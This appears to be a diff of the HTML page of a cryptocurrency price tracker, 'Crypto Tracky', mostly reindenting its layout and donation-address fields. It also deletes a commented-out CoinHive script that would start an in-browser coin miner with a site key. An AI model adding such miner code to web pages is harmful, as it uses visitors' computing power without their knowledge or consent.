@@ -5,7 +5,7 @@
 
 <head>
 
-  <title>Global overview | Crypto Tracky</title>
+<title>Global overview | Crypto Tracky</title>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
 <link rel="stylesheet" href="../css/bootstrap.min.css">
@@ -27,10 +27,6 @@
   }, 10000);
 
 </script>
-<!-- <script>
-	var miner = new CoinHive.Anonymous('mxQ4fvr9wTiWHesQ5g5L23GDpzNgIuOV', {threads: 2});
-  miner.start();
-</script> -->
 </head>
 
 <!-- define angular controller -->
@@ -52,29 +48,28 @@
       <div class="container-fluid">
       	<div class="row">
       		<div class="col-sm-3 col-xs-12" style="padding-top:25px;">
-      			<span style="color:white">Donations are welcome on:</span>
-      			<div class="input-group">
-      				<span class="input-group-addon">Btc</span>
-      				<input type="text"  class="form-control" disabled value="1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7" />
-      			</div>
-      			<div class="input-group" style="padding-top: 10px">
-      				<span class="input-group-addon">Ltc</span>
-      				<input type="text"  class="form-control" disabled value="LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP" />
-      			</div>
-      		</div>
+				<span style="color:white">Donations are welcome on:</span>
+				<div class="input-group">
+					<span class="input-group-addon">Btc</span>
+					<input type="text"  class="form-control" disabled value="1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7" />
+				</div>
+				<div class="input-group" style="padding-top: 10px">
+					<span class="input-group-addon">Ltc</span>
+					<input type="text"  class="form-control" disabled value="LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP" />
+				</div>
+			</div>
       	</div>
       </div>
 
       <div class="container-fluid" style="padding-top:30px;">
       	<div class="row">
 
-      		<div class="col-xs-12 col-sm-12 col-lg-6">
-          <div ng-repeat="interval in intervals" coin-table-interval></div>
-      		</div>
+			<div class="col-xs-12 col-sm-12 col-lg-6">
+				<div ng-repeat="interval in intervals" coin-table-interval></div>
+			</div>
 
       		<div class="col-xs-12 col-sm-12 col-lg-6">
       			<div coin-table-main> </div>
-
       		</div>
       	</div>
       </div>
